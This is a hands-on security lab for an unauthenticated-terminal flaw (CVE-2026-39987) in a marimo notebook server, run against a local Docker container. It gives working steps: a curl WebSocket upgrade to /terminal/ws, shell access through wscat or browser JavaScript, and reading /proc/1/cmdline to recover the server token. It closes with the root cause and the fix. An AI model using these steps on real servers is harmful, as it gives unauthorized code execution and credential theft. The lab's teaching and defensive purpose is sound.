# Lab: A Shell Without a Password (CVE-2026-39987)

A notebook server with a login page you can't get past — and a terminal
endpoint that never checks credentials. Find it, use it, understand it.

*Time: ~30–45 min · Level: Beginner · Needs: Docker + a web browser*

## What you'll learn

- How to tell locked endpoints from open ones by probing them
- How to fingerprint software (exact version, no credentials)
- How to map a fingerprinted version to known vulnerabilities — and verify
  the report instead of trusting it
- How to read a WebSocket handshake (`101` vs `403`)
- Why auth has to be enforced on every endpoint, not just the login page

## Key ideas

- **CVE** — a public ID for a known vulnerability. This one is CVE-2026-39987.
- **marimo** — a browser-based Python notebook server, similar to Jupyter.
- **Token** — this server's password. One is set; you don't know it, and you
  won't need it.
- **HTTP vs WebSocket** — normal web traffic is request-and-response. A
  WebSocket stays open so both sides can send messages any time. It starts
  with an HTTP "upgrade" request; the server answers `101` (accepted) or
  `403` (refused).
- **Shell** — the program that runs commands. A shell on the server means
  running any command there.

## Your target

One container: **marimo 0.20.4**, edit mode, port **8080**, running as the
unprivileged user `labuser`. Token auth is enabled.

## Setup

```bash
docker compose up -d --build
```

Check it's up (no login required):

```bash
curl -s http://localhost:8080/api/version
```

```
0.20.4
```

If you get "connection refused", the container is still starting — wait a
few seconds and retry.

## Task 1 — Confirm the login holds

**Goal:** verify the front door checks credentials, so you can rule it out.

```bash
curl -s -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' http://localhost:8080/
```

```
HTTP 303 -> http://localhost:8080/auth/login?next=http%3A%2F%2Flocalhost%3A8080%2F
```

Open `http://localhost:8080` in a browser and submit a wrong password:

```
Invalid password
```

The password is real and enforced here. Move on.

Note: on a real engagement you would also test this form — default
credentials, weak passwords, error behavior. That step is out of scope for
this lab, but don't skip it on a real target.

## Task 2 — Probe what's exposed

**Goal:** map the unauthenticated surface and identify the software version.

Locked doors answer too: a `401` means auth works there, a `200` means
nobody locked it. Try each endpoint on its own:

```bash
curl -s -w '\n[%{http_code}]\n' http://localhost:8080/health
curl -s -w '\n[%{http_code}]\n' http://localhost:8080/api/version
curl -s -w '\n[%{http_code}]\n' http://localhost:8080/api/status
curl -s -w '\n[%{http_code}]\n' http://localhost:8080/api/usage
```

```
{"status":"healthy"}
[200]
0.20.4
[200]
{"detail":"Authorization header required"}
[401]
{"detail":"Authorization header required"}
[401]
```

The `401`s show auth is wired up where it was added. The `200`s are unlocked
health checks. `/api/version` gives the exact release: **marimo 0.20.4**.

That version turns "some server" into a researchable target. Next step on
any engagement: check what's publicly known about this exact release. Search
CVE databases, security advisories, and exploit archives for known issues in
marimo 0.20.4 — that's Task 3.

## Task 3 — Research the version, form a hypothesis

**Goal:** find out what's publicly known about marimo 0.20.4, and come back
with a testable claim.

Fingerprinting told you *what* it is. Now find out what's *known* about it.
Search CVE databases, security advisories, and exploit archives for this
version — NVD, vendor writeups, exploit archives. Same search you'd run on
any engagement.

You will find CVE-2026-39987, and the reports agree on the claim:

- the edit-mode terminal lives at `/terminal/ws`
- it accepts WebSocket connections without checking the token
- a connection yields a working shell on the server
- 0.20.4 is affected; fixed in 0.23.0

Treat that as a hypothesis, not a fact. Reports describe someone else's
target. Yours might be configured differently, patched, or unreachable. A
pentester verifies before reporting anything — so your test plan writes
itself: does `/terminal/ws` on *this* server complete a handshake with no
credentials? That's Task 4.

Note what you did not do: read the application's source code. On many
targets you won't have it. Version-to-advisory-to-verification works
black-box, which is why it's the default flow.

## Task 4 — Test the handshake

**Goal:** request a WebSocket upgrade with no credentials and read the
response.

```bash
curl -i -s -N \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' \
  -H 'Sec-WebSocket-Version: 13' \
  -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
  --max-time 3 http://localhost:8080/terminal/ws
```

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
...

<binary bytes>...labuser@c07xx: /lab$
```

`101` means accepted. The last line is a live shell prompt — no login, no
cookie, no token.

## Task 5 — Use the shell

**Goal:** run commands through the open socket.

With Node available:

```bash
npx -y wscat -c ws://localhost:8080/terminal/ws
```

Type `id`, press Enter:

```
Connected (press CTRL+C to quit)
labuser@c07xx:/lab$ id
uid=1000(labuser) gid=1000(labuser) groups=1000(labuser)
```

That is remote code execution as the server's own user, obtained without
authenticating.

Without Node, use the browser: open `http://localhost:8080`, press F12,
Console tab, paste:

```js
const ws = new WebSocket("ws://localhost:8080/terminal/ws");
ws.onmessage = e => console.log("SHELL>", e.data);
ws.onopen = () => ws.send("id\r");
```

Two rules from here on. First: the console only speaks JavaScript. `ws` is
your one pipe to the shell, so every further command goes through
`ws.send("...")`. Typing a shell command bare gives `SyntaxError`, because
the console tries to run it as JS. (Don't refresh the page either — that
kills the socket.) Second: every command needs a trailing `\r` (carriage
return) or the shell never runs it.

Don't be alarmed by the mess: replies arrive as the raw terminal stream,
so readable text comes wrapped in escape codes (`[?2004h`, `[01;32m`,
and friends). That noise is normal. If you can spot `uid=1000(labuser)`
in it, it worked.

`wscat -x 'id'` has the same `\r` problem — it sends no newline and appears
to do nothing. Use `-x $'id\r'` instead.

## Task 6 — Show impact

**Goal:** read something only the server knows, to prove the access is real.

In `wscat`, type:

```bash
tr '\0' ' ' < /proc/1/cmdline
```

In the browser console, the same command goes through the pipe — with one
trap: the backslash must be doubled. JavaScript reads `"\0"` as a null byte,
not backslash-zero (verified), so this:

```js
ws.send("tr '\0' ' ' < /proc/1/cmdline\r")
```

silently sends the wrong bytes. Write it as:

```js
ws.send("tr '\\0' ' ' < /proc/1/cmdline\r")
```

The reply is ugly — escape codes everywhere — but inside it is the server's
own startup command:

```
... --token-password labtoken
```

Real console output looks more like
`SHELL> ...labuser@<id>: /lab$ ... --token-password labtoken`
with `[?...]` codes scattered through it. Read past the noise; the token
is the signal.

The password you never had, recovered from inside the server.

## What happened

marimo enforces auth per endpoint: each dangerous route is expected to call
`validate_auth()` itself. The kernel socket does. The plot proxy does. The
terminal in 0.20.4 does not — it goes from the edit-mode check straight to
forking a real shell. The token locked the front door; the terminal was
never fitted with a lock. Fixed in 0.23.0 by adding the check before
accepting the connection.

For real systems:

- Audit every endpoint for auth, not just the login page. The missed one is
  usually a websocket, a debug route, or an over-informative health check.
- Version strings and frontend bundles expose your exact code. Decide what
  is public deliberately.
- Run services as unprivileged users, as this lab does. It doesn't stop the
  break-in, but it limits what the break-in is worth.

## Questions and answers

**The server had a password. Why didn't it stop this?**
The password is only checked where the code calls `validate_auth()`.
`/terminal/ws` never calls it, so the token is never examined.

**What does `101` vs `403` mean on a WebSocket handshake?**
`101` accepts the upgrade and opens the channel. `403` refuses it before
any socket exists.

**Why did `/api/version` matter if it shows no bug?**
It gave the exact release, which led to the advisory, which gave you an
endpoint to test. Recon compounds.

**What is the fix in one sentence?**
Call `validate_auth()` on `/terminal/ws` before accepting the socket, as
marimo 0.23.0 does.

## Cleanup

```bash
docker compose down
```
